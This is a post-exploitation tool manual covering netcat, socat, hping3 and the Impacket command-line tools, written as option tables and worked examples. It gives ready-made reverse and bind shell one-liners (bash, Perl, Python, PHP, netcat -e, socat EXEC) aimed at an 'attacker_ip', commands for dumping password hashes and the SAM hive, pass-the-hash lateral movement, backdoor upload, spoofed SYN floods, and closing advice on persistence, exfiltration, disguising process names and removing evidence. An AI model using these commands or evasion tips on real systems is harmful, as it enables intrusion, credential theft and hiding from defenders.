# Post-Exploitation Tools Documentation

This document provides comprehensive technical documentation for post-exploitation tools used in cybersecurity assessments. Each tool section includes description, syntax, options, examples, and best practices. These tools are used after gaining initial access to a target system for pivoting, data exfiltration, network reconnaissance, and maintaining access.

## 1. NETCAT-TRADITIONAL

### Description
Netcat (traditional) is a versatile networking utility known as the "Swiss Army knife" of networking. It reads and writes data across network connections using TCP or UDP protocols. Netcat is essential for post-exploitation activities including reverse shells, port forwarding, network auditing, banner grabbing, and data transfer between systems. The traditional version includes features like the ability to execute programs and scripts, making it ideal for establishing reverse shells.

### Basic Syntax

```bash
netcat [options] [target_host] [target_port]
```

### Available Options

| Option | Description |
|--------|-------------|
| `-4` | Use IPv4 only |
| `-6` | Use IPv6 only |
| `-c` | Execute shell command after connection |
| `-e filename` | Execute program after connection |
| `-g hop1[,hop2,...]` | Source routing hops |
| `-G num` | Source routing pointer |
| `-i seconds` | Delay interval for lines sent |
| `-l` | Listen mode (incoming connections) |
| `-k` | Keep listening after disconnect (requires -l) |
| `-n` | Numeric-only IP addresses (no DNS) |
| `-o file` | Hex dump of traffic to file |
| `-p port` | Local port number |
| `-q seconds` | Delay after EOF on stdin |
| `-r` | Randomize local and remote ports |
| `-s addr` | Local source address |
| `-t` | Enable Telnet negotiation |
| `-u` | Use UDP instead of TCP |
| `-v` | Verbose output (can be used multiple times) |
| `-w seconds` | Connection timeout |
| `-z` | Zero-I/O mode (port scanning) |

### Modes of Operation

#### Client Mode
Connect to a remote host on a specified port:
```bash
netcat [hostname] [port]
```

#### Server Mode
Listen for incoming connections:
```bash
netcat -l -p [port]
```

### Examples

**Basic connection:**
```bash
netcat example.com 80
```

**Banner grabbing:**
```bash
netcat example.com 22
```

**Chat server (listen mode):**
```bash
netcat -l -p 1234
```

**Chat client:**
```bash
netcat server.example.com 1234
```

**File transfer - sender:**
```bash
netcat -l -p 1234 < file.txt
```

**File transfer - receiver:**
```bash
netcat server.example.com 1234 > received.txt
```

**Reverse shell (on target):**
```bash
netcat -e /bin/bash attacker_ip 4444
```

**Reverse shell listener (attacker):**
```bash
netcat -l -p 4444
```

**Bind shell (on target):**
```bash
netcat -l -p 4444 -e /bin/bash
```

**Connect to bind shell:**
```bash
netcat target_ip 4444
```

**Port scanning:**
```bash
netcat -z -v -n 192.168.1.100 1-1000
```

**UDP port scan:**
```bash
netcat -z -u -v -n 192.168.1.100 1-1000
```

**Execute command on connection:**
```bash
netcat -l -p 1234 -c "whoami"
```

**HTTP request:**
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | netcat example.com 80
```

**Persistent listener:**
```bash
netcat -l -k -p 4444
```

**Port forwarding (simple):**
```bash
netcat -l -p 8000 | netcat internal_server 80
```

**Hex dump of traffic:**
```bash
netcat -l -p 4444 -o traffic.hex
```

**Timeout connection:**
```bash
netcat -w 3 example.com 80
```

**Telnet negotiation:**
```bash
netcat -t example.com 23
```

### Common Shells

**Bash reverse shell:**
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

**Perl reverse shell:**
```bash
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Python reverse shell:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP reverse shell:**
```bash
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"attacker_ip",4444);socket_write($s,"shell",5);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Best Practices

1. Use `-n` to skip DNS lookups for faster connections
2. Implement timeouts (`-w`) to avoid hanging connections
3. Use `-k` for listeners that need to handle multiple connections
4. Always encrypt sensitive data when possible (use with VPN or SSH tunnel)
5. Document all reverse shell connections for audit trails
6. Use proper encoding and obfuscation in production environments
7. Test shells in controlled environments before deployment
8. Implement connection redundancy for reliable access
9. Use process substitution for complex port forwarding scenarios
10. Monitor network traffic when using netcat for security assessments

---

## 2. SOCAT

### Description
Socat (SOcket CAT) is a command-line utility that establishes two bidirectional byte streams and transfers data between them. It is more powerful and flexible than netcat, supporting a wide range of socket types including TCP, UDP, SSL, Unix sockets, and more. Socat is essential for advanced port forwarding, proxying, and creating secure connections in post-exploitation scenarios.

### Basic Syntax

```bash
socat [options] address1 address2
```

### Address Specification

| Address Type | Syntax | Description |
|--------------|--------|-------------|
| TCP | `TCP-LISTEN:port` | Listen on TCP port |
| TCP | `TCP:host:port` | Connect to TCP port |
| UDP | `UDP-LISTEN:port` | Listen on UDP port |
| UDP | `UDP:host:port` | Connect to UDP port |
| SSL | `OPENSSL-LISTEN:port` | Listen on SSL port |
| SSL | `OPENSSL:host:port` | Connect via SSL |
| Unix | `UNIX-LISTEN:path` | Listen on Unix socket |
| Unix | `UNIX-CONNECT:path` | Connect to Unix socket |
| File | `FILE:path` | Read/write file |
| Pipe | `PIPE:path` | Named pipe |
| STDIO | `-` | Standard input/output |
| Proxy | `PROXY:proxyhost:host:port` | HTTP/HTTPS proxy |

### Available Options

| Option | Description |
|--------|-------------|
| `-V` | Show version |
| `-h` | Show help |
| `-d` | Increase debug level (up to -ddd) |
| `-D` | Enable binary data transfer |
| `-b` | Data buffer size (default: 8192) |
| `-c` | Execute command in child process |
| `-C` | Close connection after EOF |
| `-E` | Keep open on stdin close |
| `-g` | Do not look up hostnames |
| `-T` | Timeout for idle connections |
| `-t` | Timeout for connection setup |
| `-w` | Timeout for data transfer |
| `-v` | Verbose mode |
| `-x` | Hex dump of traffic |
| `fork` | Fork after connection |
| `reuseaddr` | Allow address reuse |
| `bind` | Bind to local address |
| `connect-timeout` | Timeout for connection |
| `retry` | Retry count for listen |
| `interval` | Retry interval |
| `nodelay` | Disable Nagle's algorithm |
| `keepalive` | Enable keep-alive |
| `so-rcvbuf` | Socket receive buffer size |
| `so-sndbuf` | Socket send buffer size |
| `tcp-maxseg` | TCP maximum segment size |
| `tcp-nodelay` | Disable Nagle's algorithm (TCP_NODELAY) |

### Examples

**Basic TCP connection:**
```bash
socat - TCP:example.com:80
```

**TCP listener:**
```bash
socat TCP-LISTEN:4444 -
```

**File transfer:**
```bash
socat TCP-LISTEN:4444 FILE:received.txt
```

**File read:**
```bash
socat - FILE:/etc/passwd
```

**SSL listener:**
```bash
socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt -
```

**SSL connection:**
```bash
socat OPENSSL:example.com:443 -
```

**Reverse shell:**
```bash
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

**Reverse shell (with TTY):**
```bash
socat TCP-LISTEN:4444 EXEC:"/bin/bash -li",pty,setsid,sigint,sane
```

**Connect and execute:**
```bash
socat TCP:192.168.1.100:4444 EXEC:"/bin/bash"
```

**Port forwarding (simple):**
```bash
socat TCP-LISTEN:8000 TCP:192.168.1.100:80
```

**Port forwarding (persistent):**
```bash
socat TCP-LISTEN:8000,fork,reuseaddr TCP:192.168.1.100:80
```

**UDP port forwarding:**
```bash
socat UDP-LISTEN:8000 UDP:192.168.1.100:53
```

**Forward local port to remote:**
```bash
socat TCP-LISTEN:2222,fork TCP:localhost:22
```

**Proxy connection:**
```bash
socat PROXY:proxy.example.com:example.com:80 -
```

**Unix socket listener:**
```bash
socat UNIX-LISTEN:/tmp/socket.sock -
```

**Connect to Unix socket:**
```bash
socat UNIX-CONNECT:/tmp/socket.sock -
```

**Create named pipe:**
```bash
socat PIPE:/tmp/pipe.fifo -
```

**Transfer with encryption:**
```bash
socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0 FILE:data.txt
```

**Multi-connection handler:**
```bash
socat TCP-LISTEN:4444,fork,reuseaddr -
```

**Tunnel with SOCKS:**
```bash
socat SOCKS4:proxy:192.168.1.100:80 TCP:target:80
```

**Verbose output:**
```bash
socat -v TCP-LISTEN:4444 -
```

**Hex dump of traffic:**
```bash
socat -x TCP-LISTEN:4444 TCP:192.168.1.100:80
```

**Debug mode:**
```bash
socat -d -d TCP-LISTEN:4444 -
```

**High performance transfer:**
```bash
socat -b 65536 TCP-LISTEN:4444 FILE:data.bin
```

### Advanced Examples

**Interactive shell with TTY:**
```bash
socat TCP-LISTEN:4444,reuseaddr EXEC:'/bin/bash -li',pty,setsid,sigint,sane
```

**Client with TTY:**
```bash
socat -,raw,echo=0 TCP:192.168.1.100:4444
```

**SOCKS proxy:**
```bash
socat TCP-LISTEN:1080 SOCKS4:192.168.1.1:google.com:80
```

**HTTP proxy:**
```bash
socat TCP-LISTEN:8888 PROXY:proxy:www.google.com:80
```

**SSL with certificate verification:**
```bash
socat OPENSSL:localhost:443,cafile=ca.pem -
```

**Port redirection with source IP:**
```bash
socat TCP-LISTEN:80,bind=192.168.1.10,fork TCP:10.0.0.1:80
```

### Best Practices

1. Use `fork` for listeners that need to handle multiple connections
2. Use `reuseaddr` to avoid address binding errors
3. Use `-T` and `-w` timeouts to prevent hanging connections
4. Use SSL (`OPENSSL`) for encrypted data transfer
5. Use `pty` and related options for proper TTY handling in shells
6. Use `nodelay` for latency-sensitive applications
7. Use `keepalive` to detect dropped connections
8. Increase buffer size (`-b`) for faster file transfers
9. Use `-d` for debugging connection issues
10. Use `bind` to specify source address for routing control
11. Document complex socat commands for reproducibility
12. Test configurations in development before deployment

---

## 3. HPING3

### Description
Hping3 is a network tool capable of assembling and sending custom ICMP/TCP/UDP packets. It can perform network auditing, firewall testing, path MTU discovery, and advanced port scanning. Hping3 is particularly useful for post-exploitation activities including network reconnaissance, traffic analysis, and simulating various network conditions for testing security controls.

### Basic Syntax

```bash
hping3 [options] [mode] [target]
```

### Available Options

| Option | Description |
|--------|-------------|
| `-a` | Spoof source address |
| `-k` | Keep source port |
| `-I` | Set network interface |
| `-V` | Verbose mode |
| `-D` | Debugging mode |
| `-z` | Bind ctrl+z to increase TTL |
| `-Z` | Unbind ctrl+z |
| `-1` | ICMP mode |
| `-2` | UDP mode |
| `-8` | Scan mode |
| `-9` | Listen mode |
| `-c` | Packet count |
| `-i` | Interval between packets |
| `-w` | TCP window size |
| `-s` | Source port |
| `-p` | Destination port |
| `-4` | IPv4 mode (default) |
| `-6` | IPv6 mode |
| `-C` | ICMP code |
| `-F` | Set FIN flag |
| `-S` | Set SYN flag |
| `-R` | Set RST flag |
| `-P` | Set PSH flag |
| `-A` | Set ACK flag |
| `-U` | Set URG flag |
| `-X` | Set Xmas flags |
| `-Y` | Set Ymas flags |
| `-d` | Data size |
| `-E` | Append data from file |
| `-e` | Set data string |
| `--tcpexit` | TCP flags to exit |
| `--signature` | Add signature to data |
| `--badfrag` | Use bad IP fragments |
| `--flood` | Send packets as fast as possible |
| `--rand-dest` | Random destination address |
| `--rand-source` | Random source address |
| `--beep` | Beep on probe match |

### Mode Options

| Mode | Syntax | Description |
|------|--------|-------------|
| IP | Default | Send IP packets with TCP/UDP |
| ICMP | `-1` | ICMP echo request mode |
| UDP | `-2` | UDP mode |
| Scan | `-8` | Scan mode (range of ports) |
| Listen | `-9` | Listen for packets |

### ICMP Types (with `-1`)

| Type | Syntax | Description |
|------|--------|-------------|
| Echo Reply | `--icmptype 0` | ICMP Echo Reply |
| Echo Request | `--icmptype 8` | ICMP Echo Request (default) |
| Timestamp | `--icmptype 13` | ICMP Timestamp |
| Info | `--icmptype 15` | ICMP Information |
| Address | `--icmptype 17` | ICMP Address Mask |

### Examples

**Basic ICMP ping:**
```bash
hping3 example.com
```

**ICMP timestamp request:**
```bash
hping3 --icmptype 13 example.com
```

**UDP packet to port 53:**
```bash
hping3 -2 example.com -p 53
```

**TCP SYN scan:**
```bash
hping3 -8 1-1000 -S example.com
```

**TCP connect scan:**
```bash
hping3 -c 100 -S example.com -p ++1
```

**Spoofed source address:**
```bash
hping3 -a 192.168.1.1 example.com -S -p 80
```

**Specify source port:**
```bash
hping3 example.com -S -s 4444 -p 80
```

**Keep source port:**
```bash
hping3 example.com -S -k -p 80
```

**Custom data size:**
```bash
hping3 example.com -S -p 80 -d 1000
```

**Data from file:**
```bash
hping3 example.com -S -p 80 -E payload.txt
```

**Firewall testing (ACK scan):**
```bash
hping3 -A example.com -p 80
```

**FIN scan (stealth):**
```bash
hping3 -F example.com -p 80
```

**Xmas scan:**
```bash
hping3 -X example.com -p 80
```

**Null scan:**
```bash
hping3 -Y example.com -p 80
```

**MTU discovery:**
```bash
hping3 --mtu 1400 example.com
```

**Traceroute with ICMP:**
```bash
hping3 --traceroute -V -1 example.com
```

**Rate limited packets:**
```bash
hping3 example.com -S -p 80 -i u100000
```

**Flood mode (stress test):**
```bash
hping3 --flood -S example.com -p 80
```

**Random destination addresses:**
```bash
hping3 --rand-dest 192.168.1.0/24
```

**Random source addresses:**
```bash
hping3 --rand-source example.com
```

**Listen mode:**
```bash
hping3 --listen 0.0.0.0 -I eth0
```

**Add signature to packets:**
```bash
hping3 example.com -S -p 80 --sign PING
```

**Verbose mode:**
```bash
hping3 -V example.com -S -p 80
```

**Debug mode:**
```bash
hping3 -D example.com -S -p 80
```

**Specify network interface:**
```bash
hping3 -I eth0 example.com -S -p 80
```

**TCP window size:**
```bash
hping3 example.com -S -p 80 -w 65535
```

### Advanced Examples

**Traceroute with TCP:**
```bash
hping3 --traceroute -S -p 80 -V example.com
```

**Path MTU discovery:**
```bash
hping3 --mtu 1300 -1 example.com -d 1200
```

**Simulate SYN flood:**
```bash
hping3 -c 10000 -S -p 80 --flood example.com
```

**Firewall testing (detect filtering):**
```bash
hping3 -c 5 -S -p 80 example.com
hping3 -c 5 -F -p 80 example.com
hping3 -c 5 -A -p 80 example.com
```

**Detect if port is filtered:**
```bash
hping3 -c 1 -S -p 80 example.com
```

**Idle/Zombie scan:**
```bash
hping3 -c 1 -S -p 80 -a zombie_ip target_ip
```

### Best Practices

1. Use `-c` to limit packet count for testing
2. Use `-i` for rate limiting to avoid overwhelming targets
3. Use `-V` for verbose output during troubleshooting
4. Use `--flood` only for stress testing, not reconnaissance
5. Use `-a` for spoofing when testing firewall rules
6. Use `-k` to maintain consistent source ports
7. Combine with tcpdump for packet analysis
8. Use `--traceroute` for path analysis
9. Test firewall rules systematically with different flag combinations
10. Use `-D` for detailed debugging of issues
11. Document all hping3 commands for reproducibility
12. Use appropriate timeouts and intervals for network conditions
13. Use `--rand-source` only in controlled test environments

---

## 4. IMPACKET CLIs

### Description
Impacket is a collection of Python classes for working with network protocols. It provides low-level programmatic access to many network protocols including SMB1-3, MSRPC, IPSEC, and more. The Impacket command-line tools (CLIs) are essential for post-exploitation activities including remote command execution, credential dumping, and lateral movement in Windows environments.

### Available Tools

| Tool | Description | Protocol |
|------|-------------|----------|
| `psexec.py` | Remote command execution | SMB/RPC |
| `smbclient.py` | SMB client for file operations | SMB |
| `secretsdump.py` | Dumping password hashes | SMB/RPC |
| `wmiexec.py` | WMI-based command execution | WMI |
| `dcomexec.py` | DCOM-based command execution | DCOM/RPC |
| `atexec.py` | Scheduled task execution | SMB/RPC |
| `smbexec.py` | Similar to psexec but using SMB | SMB |
| `rpcdump.py` | Enumerate RPC endpoints | RPC |
| `samrdump.py` | Enumerate SAM accounts | RPC |
| `lookupsid.py` | SID lookup for users/groups | RPC |
| `smbrelayx.py` | SMB relay attack tool | SMB |
| `ntlmrelayx.py` | NTLM relay attack tool | SMB/HTTP |
| `getTGT.py` | Request Kerberos TGT | Kerberos |
| `getST.py` | Request Kerberos TGS | Kerberos |
| `smbclient.py` | FTP-like SMB client | SMB |

### PSEXEC.PY

#### Description
psexec.py executes a command and spawns an interactive shell on the remote system using SMB/RPC. It requires administrative privileges and creates a service on the remote host.

#### Syntax

```bash
psexec.py [[domain/]username[:password]@]target [command]
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes in LM:NT format |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos authentication |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-service-name` | Name of the service to create |
| `-remote-service-name` | Name of the remote service |
| `-share` | Share to connect to (default: ADMIN$) |
| `-cleanup` | Cleanup created service |
| `-wait` | Wait for output (default: 5 seconds) |
| `-debug` | Enable debug mode |
| `-codec` | Encoding for output |

#### Examples

**Interactive shell:**
```bash
psexec.py domain/administrator:password@192.168.1.100
```

**Execute single command:**
```bash
psexec.py domain/administrator:password@192.168.1.100 whoami
```

**With NTLM hash:**
```bash
psexec.py -hashes LM:NTLM domain/administrator@192.168.1.100
```

**Using Kerberos:**
```bash
psexec.py -k domain/administrator@dc.domain.local
```

**Custom service name:**
```bash
psexec.py domain/admin:pass@192.168.1.100 -service-name CustomSvc
```

**Cleanup after execution:**
```bash
psexec.py domain/admin:pass@192.168.1.100 -cleanup whoami
```

**Specify share:**
```bash
psexec.py domain/admin:pass@192.168.1.100 -share C$
```

### SMBEXEC.PY

#### Description
smbexec.py provides semi-interactive shell capabilities similar to psexec but uses a different approach that may bypass some security controls. It doesn't create a service but executes commands through the service manager.

#### Syntax

```bash
smbexec.py [[domain/]username[:password]@]target [command]
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-share` | Share to use |
| `-debug` | Enable debug mode |

#### Examples

**Interactive shell:**
```bash
smbexec.py domain/administrator:password@192.168.1.100
```

**Execute command:**
```bash
smbexec.py domain/administrator:password@192.168.1.100 "ipconfig /all"
```

**With hashes:**
```bash
smbexec.py -hashes LM:NTLM domain/administrator@192.168.1.100
```

### WMIEXEC.PY

#### Description
wmiexec.py provides semi-interactive shell using Windows Management Instrumentation (WMI). It creates processes through WMI, which may provide more stealth than psexec as it doesn't create services.

#### Syntax

```bash
wmiexec.py [[domain/]username[:password]@]target [command]
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-share` | Share to connect to |
| `-shell` | Shell type (cmd or powershell) |
| `-codec` | Encoding for output |
| `-debug` | Enable debug mode |

#### Examples

**Interactive shell:**
```bash
wmiexec.py domain/administrator:password@192.168.1.100
```

**Execute command:**
```bash
wmiexec.py domain/administrator:password@192.168.1.100 whoami /all
```

**PowerShell execution:**
```bash
wmiexec.py domain/administrator:password@192.168.1.100 -shell powershell "Get-Process"
```

**With hashes:**
```bash
wmiexec.py -hashes LM:NTLM domain/administrator@192.168.1.100
```

### SECRETSDUMP.PY

#### Description
secretsdump.py performs various techniques to dump secrets from the remote machine without installing any service. It can extract NTDS.dit, SAM, LSA secrets, and cached domain credentials.

#### Syntax

```bash
secretsdump.py [[domain/]username[:password]@]target
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-system` | Use local system hive file |
| `-sam` | Use local SAM hive file |
| `-ntds` | Use NTDS.dit file |
| `-security` | Use security hive file |
| `-history` | Show password history |
| `-just-dc` | Extract only DC accounts |
| `-just-dc-ntlm` | Extract only NTLM hashes |
| `-pwd-last-set` | Show last password set |
| `-user-status` | Show user status |
| `-outputfile` | Output to file |

#### Examples

**Dump SAM (local system):**
```bash
secretsdump.py -system SYSTEM -sam SAM local
```

**Dump SAM from remote host:**
```bash
secretsdump.py domain/administrator:password@192.168.1.100
```

**Dump DC NTLM hashes only:**
```bash
secretsdump.py -just-dc-ntlm domain/administrator:password@dc.domain.local
```

**Dump with hashes:**
```bash
secretsdump.py -hashes LM:NTLM domain/administrator@192.168.1.100
```

**Dump NTDS.dit from file:**
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**Save to file:**
```bash
secretsdump.py domain/administrator:password@192.168.1.100 -outputfile results
```

**Show password history:**
```bash
secretsdump.py domain/administrator:password@192.168.1.100 -history
```

### SMBclient.py

#### Description
smbclient.py provides an FTP-like interface to interact with SMB shares. It allows browsing, uploading, downloading, and managing files on SMB shares.

#### Syntax

```bash
smbclient.py [[domain/]username[:password]@]target
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-share` | Share to connect to |
| `-domain` | Domain for authentication |
| `-trees` | List available shares |
| `-list` | List files in share |
| `-debug` | Enable debug mode |

#### Examples

**Connect and list shares:**
```bash
smbclient.py domain/administrator:password@192.168.1.100 --trees
```

**Connect to specific share:**
```bash
smbclient.py domain/administrator:password@192.168.1.100 -share C$
```

**Interactive commands after connection:**

| Command | Description |
|---------|-------------|
| `ls` | List files |
| `cd path` | Change directory |
| `get file` | Download file |
| `put file` | Upload file |
| `mkdir dir` | Create directory |
| `rm file` | Delete file |
| `exit` | Disconnect |

**Download file:**
```bash
smbclient.py domain/administrator:password@192.168.1.100 -share C$
> get Windows\System32\config\SAM
```

**Upload file:**
```bash
smbclient.py domain/administrator:password@192.168.1.100 -share C$
> put /tmp/backdoor.exe
```

### ATEXEC.PY

#### Description
atexec.py executes commands through the Task Scheduler service on the remote system. It creates and executes a scheduled task for one-time command execution.

#### Syntax

```bash
atexec.py [[domain/]username[:password]@]target [command]
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-debug` | Enable debug mode |

#### Examples

**Execute command:**
```bash
atexec.py domain/administrator:password@192.168.1.100 whoami
```

**Execute PowerShell:**
```bash
atexec.py domain/administrator:password@192.168.1.100 "powershell -e base64payload"
```

**Execute with hashes:**
```bash
atexec.py -hashes LM:NTLM domain/administrator@192.168.1.100 whoami
```

### DCOMEXEC.PY

#### Description
dcomexec.py provides semi-interactive shell using DCOM objects. It can execute commands through various DCOM interfaces including MMC20.Application.

#### Syntax

```bash
dcomexec.py [[domain/]username[:password]@]target [command]
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-shell` | Shell type (cmd or powershell) |
| `-object` | DCOM object to use |
| `-debug` | Enable debug mode |

#### DCOM Objects

| Object | Description |
|--------|-------------|
| ` MMC20.Application` | MMC snap-in automation |
| `ShellWindows` | Explorer shell automation |
| `ShellBrowserWindow` | Browser window automation |

#### Examples

**Interactive shell:**
```bash
dcomexec.py domain/administrator:password@192.168.1.100
```

**Execute command:**
```bash
dcomexec.py domain/administrator:password@192.168.1.100 systeminfo
```

**Specific DCOM object:**
```bash
dcomexec.py domain/admin:pass@192.168.1.100 -object ShellWindows "dir"
```

**PowerShell:**
```bash
dcomexec.py domain/admin:pass@192.168.1.100 -shell powershell "Get-ChildItem"
```

### LOOKUPSID.PY

#### Description
lookupsid.py performs SID lookups to enumerate users and groups on the remote system or domain. It can discover usernames from SIDs even when user enumeration is restricted.

#### Syntax

```bash
lookupsid.py [[domain/]username[:password]@]target
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-domain-sids` | Enumerate domain SIDs only |
| `-trusted-pass` | Show trusted domain relationships |
| `-debug` | Enable debug mode |

#### Examples

**Enumerate users and groups:**
```bash
lookupsid.py domain/administrator:password@192.168.1.100
```

**Enumerate domain SIDs only:**
```bash
lookupsid.py domain/administrator:password@192.168.1.100 -domain-sids
```

**Show trust relationships:**
```bash
lookupsid.py domain/administrator:password@192.168.1.100 -trusted-pass
```

### RPCRPCDUMP.PY

#### Description
rpcdump.py enumerates RPC endpoints and displays information about available interfaces on the target system. This is useful for discovering attackable services.

#### Syntax

```bash
rpcdump.py [[domain/]username[:password]@]target
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-protocol` | Protocol sequence (ncacn_ip_tcp, ncalrpc) |
| `-debug` | Enable debug mode |

#### Examples

**Enumerate RPC endpoints:**
```bash
rpcdump.py domain/administrator:password@192.168.1.100
```

**Filter for specific interface:**
```bash
rpcdump.py domain/admin:pass@192.168.1.100 | grep -i epmapper
```

### SAMRDUMP.PY

#### Description
samrdump.py enumerates information from the Security Account Manager (SAM) through RPC. It can retrieve user accounts, groups, and policies.

#### Syntax

```bash
samrdump.py [[domain/]username[:password]@]target
```

#### Options

| Option | Description |
|--------|-------------|
| `-hashes` | NTLM hashes |
| `-no-pass` | Don't ask for password |
| `-k` | Use Kerberos |
| `-aesKey` | AES key for Kerberos |
| `-dc-ip` | Domain Controller IP |
| `-debug` | Enable debug mode |

#### Examples

**Enumerate SAM information:**
```bash
samrdump.py domain/administrator:password@192.168.1.100
```

### General Impacket Best Practices

1. Use `-hashes` when you have NTLM hashes but not passwords
2. Use `-k` and `-aesKey` for Kerberos-based authentication
3. Use `-dc-ip` to specify the Domain Controller when authenticating
4. Use `-debug` for troubleshooting authentication issues
5. Clean up services created by psexec with `-cleanup`
6. Use wmiexec and dcomexec for more stealthy lateral movement
7. Use secretsdump for comprehensive credential extraction
8. Use lookupsid to discover usernames even when enumeration is blocked
9. Document all command execution for audit trails
10. Use appropriate encoding (`-codec`) for non-ASCII output
11. Test tools in development environment before production use
12. Use NTLMrelayx.py for relay attacks in appropriate scenarios
13. Be aware of logging and alerting on target systems
14. Use `smbclient.py` for file operations when shell access isn't needed
15. Chain multiple tools for comprehensive post-exploitation

---

## General Post-Exploitation Best Practices

### 1. Methodology

1. **Initial access validation**: Confirm access is stable and reproducible
2. **Information gathering**: Collect system and network information
3. **Privilege escalation**: Identify and exploit privilege escalation paths
4. **Credential harvesting**: Extract passwords, hashes, and tokens
5. **Lateral movement**: Use harvested credentials to access other systems
6. **Persistence**: Establish additional access mechanisms
7. **Data exfiltration**: Collect and transfer target data
8. **Cleanup**: Remove artifacts and evidence

### 2. Tool Selection

| Task | Recommended Tools |
|------|-------------------|
| Shell access | psexec.py, wmiexec.py, smbexec.py, dcomexec.py |
| Port forwarding | socat, netcat |
| Credential extraction | secretsdump.py |
| Lateral movement | psexec.py, wmiexec.py, atexec.py |
| Network reconnaissance | hping3, netcat, socat |
| File operations | smbclient.py |
| SID enumeration | lookupsid.py |

### 3. Operational Security

1. Use encrypted channels when possible (SSL/TLS with socat)
2. Minimize time between compromise and objective
3. Use living-off-the-land binaries when possible
4. Remove or obfuscate tools on target systems
5. Use legitimate-looking process names
6. Implement multiple persistence mechanisms
7. Document all activities for assessment reporting
8. Use proper encoding and encryption for exfiltration

### 4. Session Management

1. Use multiple connections for redundancy
2. Implement session persistence mechanisms
3. Use process migration to maintain access
4. Monitor connection stability
5. Have backup access paths prepared
6. Use appropriate timeouts and keepalives

### 5. Documentation Requirements

1. Record all commands executed
2. Document all credentials discovered
3. Map network topology discovered
4. Track all systems accessed
5. Preserve evidence of compromise
6. Document all persistence mechanisms
7. Record timestamps of all activities
